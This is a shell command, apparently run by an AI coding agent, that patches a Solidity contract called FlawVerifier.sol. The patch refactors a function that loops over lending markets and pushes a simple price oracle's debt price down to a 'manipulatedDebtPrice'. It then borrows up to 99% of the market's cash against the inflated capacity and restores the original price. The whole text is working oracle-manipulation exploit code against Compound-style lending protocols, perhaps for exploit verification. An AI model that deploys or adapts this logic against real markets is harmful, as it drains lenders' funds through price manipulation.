/bin/bash -lc "python3 - <<'PY'
from pathlib import Path
p = Path('FlawVerifier.sol')
s = p.read_text()
old = '''    function _borrowBestDebt(CollateralCandidate memory candidate, bool needsRepay)
        internal
        returns (BorrowResult memory result)
    {
        address[] memory markets = _markets();
        uint256 marketCount = markets.length;
        if (marketCount > MAX_MARKETS_SCAN) marketCount = MAX_MARKETS_SCAN;

        uint256 bestScore;

        for (uint256 i = 0; i < marketCount; ++i) {
            address cDebt = markets[i];
            if (cDebt == address(0) || cDebt == candidate.cCollateral) continue;

            (address debtToken, bool okUnderlying) = _underlyingOf(cDebt);
            if ("'!okUnderlying || debtToken == candidate.collateralToken) continue;

            (uint256 availableCash, bool okCash) = _safeGetCash(cDebt);
            if (!okCash || availableCash == 0) continue;

            if (needsRepay && !_hasSwapPath(candidate.dexFactory, debtToken, candidate.collateralToken)) continue;

            (uint256 originalDebtPrice, bool okPrice) = _safeOraclePrice(cDebt);
            if (!okPrice) continue;

            address debtOracle = _resolveSimplePriceOracle(cDebt, debtToken, originalDebtPrice);
            if (debtOracle == address(0)) continue;

            uint256 manipulatedDebtPrice = _reducedPrice(originalDebtPrice);
            _setOraclePrice(debtOracle, cDebt, debtToken, manipulatedDebtPrice);

            (bool okLiquidity, uint256 liquidity,) = _safeAccountLiquidity(address(this));
            if (!okLiquidity || liquidity == 0) {
                _setOraclePrice(debtOracle, cDebt, debtToken, originalDebtPrice);
                continue;
            }

            uint256 borrowCapacity = _borrowCapacityFromLiquidity(liquidity, manipulatedDebtPrice);
            uint256 borrowAmount = _min((availableCash * 99) / 100, (borrowCapacity * 95) / 100);
            if (borrowAmount == 0) {
                _setOraclePrice(debtOracle, cDebt, debtToken, originalDebtPrice);
                continue;
            }

            if (!_borrowAllowed(cDebt, borrowAmount)) {
                _setOraclePrice(debtOracle, cDebt, debtToken, originalDebtPrice);
                continue;
            }

            uint256 score = borrowAmount * manipulatedDebtPrice;
            if (score <= bestScore) {
                _setOraclePrice(debtOracle, cDebt, debtToken, originalDebtPrice);
                continue;
            }

            uint256 err = ICTokenLike(cDebt).borrow(borrowAmount);
            if (err != 0) {
                _setOraclePrice(debtOracle, cDebt, debtToken, originalDebtPrice);
                continue;
            }

            _setOraclePrice(debtOracle, cDebt, debtToken, originalDebtPrice);

            result = BorrowResult({
                cDebt: cDebt,
                debtToken: debtToken,
                debtOracle: debtOracle,
                originalDebtPrice: originalDebtPrice,
                borrowAmount: borrowAmount,
                routeMid: needsRepay
                    ? _pickRouteMid(candidate.dexFactory, debtToken, candidate.collateralToken)
                    : address(0)
            });
            bestScore = score;
            return result;
        }

        revert("no-borrow-market");
    }
'"'''
new = '''    function _borrowBestDebt(CollateralCandidate memory candidate, bool needsRepay)
        internal
        returns (BorrowResult memory result)
    {
        address[] memory markets = _markets();
        uint256 marketCount = markets.length;
        if (marketCount > MAX_MARKETS_SCAN) marketCount = MAX_MARKETS_SCAN;

        uint256 bestScore;

        for (uint256 i = 0; i < marketCount; ++i) {
            (BorrowResult memory tried, uint256 score, bool ok) = _tryBorrowMarket(candidate, markets[i], needsRepay);
            if (ok && score > bestScore) {
                return tried;
            }
        }

        revert(\"no-borrow-market\");
    }

    function _tryBorrowMarket(CollateralCandidate memory candidate, address cDebt, bool needsRepay)
        internal
        returns (BorrowResult memory result, uint256 score, bool ok)
    {
        if (cDebt == address(0) || cDebt == candidate.cCollateral) return (result, 0, false);

        (address debtToken, bool okUnderlying) = _underlyingOf(cDebt);
        if ("'!okUnderlying || debtToken == candidate.collateralToken) return (result, 0, false);

        (uint256 availableCash, bool okCash) = _safeGetCash(cDebt);
        if (!okCash || availableCash == 0) return (result, 0, false);

        if (needsRepay && !_hasSwapPath(candidate.dexFactory, debtToken, candidate.collateralToken)) {
            return (result, 0, false);
        }

        (uint256 originalDebtPrice, bool okPrice) = _safeOraclePrice(cDebt);
        if (!okPrice) return (result, 0, false);

        address debtOracle = _resolveSimplePriceOracle(cDebt, debtToken, originalDebtPrice);
        if (debtOracle == address(0)) return (result, 0, false);

        uint256 manipulatedDebtPrice = _reducedPrice(originalDebtPrice);
        _setOraclePrice(debtOracle, cDebt, debtToken, manipulatedDebtPrice);

        (bool okLiquidity, uint256 liquidity,) = _safeAccountLiquidity(address(this));
        if (!okLiquidity || liquidity == 0) {
            _setOraclePrice(debtOracle, cDebt, debtToken, originalDebtPrice);
            return (result, 0, false);
        }

        uint256 borrowCapacity = _borrowCapacityFromLiquidity(liquidity, manipulatedDebtPrice);
        uint256 borrowAmount = _min((availableCash * 99) / 100, (borrowCapacity * 95) / 100);
        if (borrowAmount == 0 || !_borrowAllowed(cDebt, borrowAmount)) {
            _setOraclePrice(debtOracle, cDebt, debtToken, originalDebtPrice);
            return (result, 0, false);
        }

        score = borrowAmount * manipulatedDebtPrice;
        uint256 err = ICTokenLike(cDebt).borrow(borrowAmount);
        if (err != 0) {
            _setOraclePrice(debtOracle, cDebt, debtToken, originalDebtPrice);
            return (result, 0, false);
        }

        _setOraclePrice(debtOracle, cDebt, debtToken, originalDebtPrice);

        result.cDebt = cDebt;
        result.debtToken = debtToken;
        result.debtOracle = debtOracle;
        result.originalDebtPrice = originalDebtPrice;
        result.borrowAmount = borrowAmount;
        result.routeMid = needsRepay ? _pickRouteMid(candidate.dexFactory, debtToken, candidate.collateralToken) : address(0);
        ok = true;
    }
'"'''
s = s.replace(old,new)
p.write_text(s)
